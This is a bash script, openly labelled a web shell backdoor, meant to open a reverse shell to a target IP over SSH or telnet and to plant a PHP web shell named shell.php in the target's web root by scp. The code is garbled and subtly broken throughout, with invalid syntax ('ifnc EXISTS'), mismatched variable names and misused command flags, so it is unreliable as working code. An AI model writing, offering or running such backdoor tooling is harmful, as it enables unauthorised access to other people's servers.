# --------------------------------
# Web Shell Backdoor (Shell)
# --------------------------------

# --- Configuration ---

# Website Root Path: Change this to your target's server root
WEBSITE_ROOT="/var/www"

# Command Timeout (seconds): How long a shell command waits before timing out.
COMMAND_TIMEOUT=60

# Shell Path: The path to the shell interpreter on the target system.
SHSHELL="/bin/bash"

# Shell Port: The port number for the reverse shell connection.
SHELL_PORT=44444 


# --- Functions ---

# Function: Reverse Shell Connection
reverse_shell() {
    local _user="www-data" # Or whatever is appropriate for your web server
    local _group="www-data"

    # Check if SSH is available and use it if possible (more secure)
    if ssh -q "$_user@$1:22" >/dev/null 2>&1; then
        echo "Using SSH reverse shell..."
        ssh -p "$SHELL_PORT" -o ConnectTimeout=$COMMAND_TIMEOUT -r "$_user@$1"
        exit $?
    else
        # Fallback: Reverse Shell via telnet (less secure)
        ifnc EXISTS ./telnet.sh; then
            echo "Using Telnet reverse shell..."
            ./telnet.sh "$1"
            exit $?
        else
            # Fallback: Standard telnet if the telnet script isn't available
            telnet "$1" -load .bash > /dev/null 2>&1 && echo "Using Telnet reverse shell..." || \
            echo "Telnet reverse shell failed. Using shell by default."
        fi
    fi
}


# Function: Execute a Command on the Target
execute_command() {
    local _shell="/$SHELLSHELL"
    local _url="$1"
    local _path="/tmp/temp.sh"

    # Write the shell code to disk
    echo "Content-Type: application/x-msdownload" > "$_path"
    echo "Content-Disposition: attachment; filename=shell.php" >> "$_path"
    echo "Content-Transfer-Encoding: binary" >> "$_path"

    # Create a basic PHP shell
    ifnc EXISTS "$_shell"; then
        echo '<?php \n\n' > "$_path"
        echo '  $command = "'"$2"'";\n' >> "$_path"
        echo '  exec("ssh -q $user@$1:22 || telnet $1 $SHELLPORT", 1, "bash"); exit;' >> "$_path"
    else
        # Create a basic shell for older systems if PHP isn't available.
        echo 'Content-Type: text/html\n\n' > "$_path"
        echo '<!DOCTYPE html>\n' >> "$_path"
        echo '<head><title>Reverse Shell</title></head>' >> "$_path"
        echo '<link rel="stylesheet" href="'"$WEBSITE_ROOT"/styles/bootstrap.min.css"> </style>' >> "$_path"
        echo '<body>\n<center>\n'  >> "$_path"
        echo '  <h1>Reverse Shell</h1>\n' >> "$_path"
        echo '  <h2>Enter command: <input type="text" name="command"></input></h3>\n' >> "$_path"
        echo '<button type="submit" class="btn btn-primary">Execute Command</button>\n' >> "$_path"
        echo '</center>' >> "$_path"
        echo '</body>\n</html>' >> "$_path"
    fi

    # Copy the file to a random location on the target server
    scp -r "$_path" "$1:$WEBSITE_ROOT/shell.php" && \
    chmod +x "$WEBSITE_ROOT/shell.php" && \
    echo "Shell uploaded to: $WEBSITE_ROOT/shell.php"

}


# --- Main Script Execution ---

if [[ -n "$1" ]]; then
  reverse_shell "$1" &
  sleep 3;
  execute_command "$1" > /dev/null 2>&1
else
  echo "Usage: ./shell.sh <target_IP>"
  exit 1
fi

echo "Backdoor shell is running..."
# Keep the script alive until manually killed (Ctrl+C)
sleep infinity
